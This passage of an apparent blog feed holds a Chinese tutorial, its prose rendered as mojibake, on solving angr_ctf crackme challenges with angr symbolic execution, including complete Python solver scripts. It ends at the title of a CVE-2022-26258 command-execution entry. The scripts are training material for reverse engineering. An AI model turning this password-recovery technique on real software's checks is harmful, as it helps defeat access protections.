punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span>  stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>simulation.explore(find=is_successful, avoid=should_abort)</code> å‘Šè¯‰ angrï¼Œåªå¯¹â€Good Jobâ€æ„Ÿå…´è¶£ï¼Œè¦é¿å…â€Try againâ€çš„è·¯å¾„ã€‚<code>find</code> å’Œ <code>avoid</code> å‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ªåœ°å€æˆ–åœ°å€åˆ—è¡¨ã€‚</p><p>æœ€åå®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./02_angr_find_condition"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span>  stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success! Solution is: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åå¾ˆå¿«å¾—åˆ°ç»“æœâ€HETOBRCUâ€</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427111953296.png" alt="image-20220427111953296"></p><h1 id="Part-2-angr-symbolic-registers"><a href="#Part-2-angr-symbolic-registers" class="headerlink" title="Part 2 angr symbolic registers"></a>Part 2 angr symbolic registers</h1><p>ç°åœ¨è€ƒè™‘ä¸€ç§æƒ…å†µï¼Œå¦‚æœ angr æ— æ³•ä»æŒ‡å®šçš„åœ°å€å¼€å§‹ç¬¦å·æ‰§è¡Œè¯¥å¦‚ä½•å¤„ç†ï¼Ÿæ¢ä¸ªè¯´æ³•ï¼Œangr åœ¨å¤„ç†ç±»ä¼¼ <code>scanf(&quot;%x %x %x&quot;, &amp;a, &amp;b, &amp;c)</code> è¿™ç§è¾“å…¥æ–¹å¼çš„æ—¶å€™å°¤ä¸ºåƒåŠ›ï¼Œå°±å¾—è€ƒè™‘å¦å¤–ä¸€ç§åŠæ³•ã€‚æˆ‘ä»¬å¯ä»¥è·³è¿‡è¿™ä¸ªè¾“å…¥å‡½æ•°ï¼Œåœ¨ç”¨åˆ°è¾“å…¥å‚æ•°çš„æ—¶å€™æˆ‘ä»¬è‡ªå®šä¹‰å¯„å­˜å™¨çš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚</p><p>é¦–å…ˆè€è§„çŸ©ï¼Œå…ˆåœ¨ IDA çœ‹çœ‹äºŒè¿›åˆ¶ç¨‹åº 03_angr_symbolic_registersã€‚ä¸»å‡½æ•°ä¸­ <code>get_user_input</code> æ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œå°†ç”¨æˆ·è¾“å…¥ç»è¿‡ <code>complex_function</code> çš„å¤„ç†ï¼Œæœ€åè¾“å‡ºâ€Good Jobâ€æˆ–â€Try againâ€ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427140721086.png" alt="image-20220427140721086"></p><p>å†çœ‹çœ‹ <code>get_user_input</code> å‡½æ•°ï¼Œæ­£å¦‚ä¸Šé¢è¯´çš„é‚£æ ·ï¼Œä½¿ç”¨ <code>scanf</code> è¿™ç§å¤æ‚çš„æ–¹å¼æ¥å—è¾“å…¥ã€‚å®ƒå°†å‚æ•°ä¾æ¬¡ç»™äº† EAXã€EBXã€EDXå¯„å­˜å™¨ï¼Œäº†è§£å‚æ•°ä¼ é€’çš„å¯„å­˜å™¨æœ‰åˆ©äºä½¿ç”¨ angr è¿›è¡Œå‚æ•°æ¨¡æ‹Ÿï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427141347745.png" alt="image-20220427141347745"></p><p>ç„¶åæŸ¥çœ‹ scaffold03.py ä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> ???  <span class="token comment"># :integer (probably hexadecimal)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    password0_size_in_bits <span class="token operator">=</span> ???  <span class="token comment"># :integer</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> password0_size_in_bits<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>??? <span class="token operator">=</span> password0  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    solution <span class="token operator">=</span> ???  <span class="token comment"># :string</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>      <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆ <code>start_address</code> ä¾ç„¶è®¾ç½®æˆ‘ä»¬å¸Œæœ›çš„èµ·å§‹åœ°å€ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨ <code>scanf</code> ä¹‹åçš„åœ°å€ 0x08048937ã€‚ç„¶åæ³¨æ„è¿™é‡Œæ˜¯ä½¿ç”¨çš„ <code>blank_state</code> è€Œä¸æ˜¯ <code>entry_state</code>ï¼Œå®é™…ä¸Šæ˜¯å‘Šè¯‰ angr åœ¨è¯¥åœ°å€åˆ›å»ºä¸€ä¸ªæ–°çš„ stateã€‚<code>claripy.BVS</code> è¡¨ç¤ºä½¿ç”¨ claripy ä¸­çš„ <code>BVS</code> æ–¹æ³•ç”Ÿæˆä½å‘é‡ï¼Œå®ƒæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°â€password0â€å°±åƒæ˜¯æ–¹ç¨‹é‡Œé¢çš„ç¬¦å·â€œxâ€ï¼Œç¬¬äºŒä¸ªå‚æ•° <code>password0_size_in_bits</code> è¡¨ç¤ºæ‰€ç”¨çš„æ•°å€¼çš„äºŒè¿›åˆ¶ä½æ•°ï¼Œ<code>int</code> å‹å°±æ˜¯32ä½ã€‚<code>initial_state.regs</code> å°†ä½¿ç”¨åˆ›å»ºçš„ä½å‘é‡ï¼Œå°†å€¼æŒ‡å®šç»™å¯„å­˜å™¨ã€‚ä¹‹åå®šä¹‰ <code>find</code> å’Œ <code>avoid</code> çŠ¶æ€ã€‚<code>solution_state.se.eval</code> æ–¹æ³•å¯ä»¥çœ‹ä½œæ˜¯æ±‚è§£å®šä¹‰çš„ä½å‘é‡ï¼Œæœ€åæ‰“å°æ±‚è§£çš„ç»“æœã€‚</p><p>ä¾ç…§ä¸Šé¢åˆ†æçš„ç»“æœä¿®æ”¹ä»£ç ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯åœ¨æˆ‘ä»¬çš„èµ·å§‹åœ°å€åœ¨ <code>scanf</code> å‡½æ•°ä¹‹åï¼Œå‡½æ•°è¿”å›éœ€è¦å¹³è¡¡æ ˆï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜å¾—ä¼ªé€ ä¸€ä¸ªæ ˆçš„å†…å®¹ã€‚å…¶å®è¿™å°±æœ‰ç‚¹è¿‡äºå¤æ‚äº†ï¼Œå†æ¬¡è§‚å¯Ÿä»£ç å¯ä»¥å¾—çŸ¥åœ¨ <code>get_user_input</code> å‡½æ•°è¿”å›ä¹‹åå°†å‚æ•°ç»™åˆ°äº† EAXã€EBXã€EDXï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»è¿™é‡Œå¼€å§‹ç»™å¯„å­˜å™¨èµ‹å€¼å°±è¡Œäº†ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427144214207.png" alt="image-20220427144214207"></p><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./03_angr_symbolic_registers"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x08048980</span>  <span class="token comment"># :integer (probably hexadecimal)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password_size_in_bits <span class="token operator">=</span> <span class="token number">32</span>  <span class="token comment"># :integer</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> password_size_in_bits<span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> password_size_in_bits<span class="token punctuation">)</span>  password2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password2'</span><span class="token punctuation">,</span> password_size_in_bits<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> password0  initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> password1  initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>edx <span class="token operator">=</span> password2  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.\n'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.\n'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>    solution2 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>    solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution1 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution2  <span class="token comment"># :string</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œåå¾—åˆ°ç»“æœï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427145237549.png" alt="image-20220427145237549"></p><h1 id="Part-3-angr-symbolic-stack"><a href="#Part-3-angr-symbolic-stack" class="headerlink" title="Part 3 angr symbolic stack"></a>Part 3 angr symbolic stack</h1><p>åœ¨ Part 2 çš„ä¾‹å­ä¸­ï¼Œä¸ºäº†å›¾æ–¹ä¾¿ï¼Œæ²¡æœ‰æ„é€ æ ˆçš„å†…å®¹ï¼Œè€Œæ˜¯è¶Šè¿‡è¾“å…¥å‡½æ•°ç›´æ¥æ„é€ å¯„å­˜å™¨å†…å®¹ï¼Œä½†æœ‰æ—¶å€™æˆ‘ä»¬ä¸å¾—ä¸å»æ„é€ æ ˆçš„å†…å®¹ã€‚</p><p>IDA æ‰“å¼€ 04_angr_symbolic_stack äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œ<code>scanf</code> å‡½æ•°å®Œæˆåç›´æ¥å¯¹è¾“å…¥å†…å®¹è¿›è¡Œæ“ä½œï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427151637284.png" alt="image-20220427151637284"></p><p>ä»æ±‡ç¼–ä»£ç æ¥çœ‹ï¼Œ<code>scanf</code> å‡½æ•°æ˜¯å¤–å¹³æ ˆï¼Œå°†ä¸¤ä¸ªè¾“å…¥å†…å®¹æ”¾å…¥äº† EBP-0x10 å’Œ EBP-0xC çš„ä½ç½®ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427152733646.png" alt="image-20220427152733646"></p><p>é‚£ä¹ˆå¯ä»¥ä» 0x08048697 åœ°å€å¼€å§‹ç»•è¿‡ <code>scanf</code> å‡½æ•°ï¼Œç„¶åæ„é€ è¿™ä¸¤ä¸ªæ ˆä¸Šçš„å†…å®¹ã€‚å…³é”®åœ¨äºå¦‚ä½•æ„é€ è¿™ä¸¤ä¸ªå†…å®¹å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ EBP å¯„å­˜å™¨ï¼Œå› ä¸º EBP åœ¨å‡½æ•°è¿”å›ä¹‹å‰æ˜¯ä¸ä¼šå˜åŠ¨çš„ï¼Œå¹¶ä¸”åœ¨å‡½æ•°å¼€å§‹çš„æ—¶å€™å°±æ‰§è¡Œäº† <code>MOV EBP, ESP</code>ï¼Œé‚£ä¹ˆåœ¨æ­¤åŸºç¡€ä¸Šï¼Œç®—å‡º ESP åœ¨æˆ‘ä»¬æŒ‡å®šçš„èµ·å§‹åœ°å€å‰å˜åŒ–å¤šå°‘ä¸ªå­—èŠ‚å°±å¯ä»¥äº†ã€‚</p><p>ç›´æ¥ä¸Šä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./04_angr_symbolic_stack"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    start_address <span class="token operator">=</span> <span class="token number">0x08048697</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>    padding_length_in_bytes <span class="token operator">=</span> <span class="token number">8</span>  <span class="token comment"># :integer</span>  initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> padding_length_in_bytes    initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>password0<span class="token punctuation">)</span>  <span class="token comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>  initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>password1<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">)</span>    solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution1    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œå¾—åˆ°ç»“æœï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427154948561.png" alt="image-20220427154948561"></p>]]></content>
      
      
      
        <tags>
            
            <tag> symbolic execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-26258 å‘½ä»¤æ‰§è¡Œæ¼æ´</title>
      <link href="/2022/04/25/cve-2022-26258-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2022/04/25/cve-2022-26258-ming-ling-zhi-xing-lou-dong/</url>
      
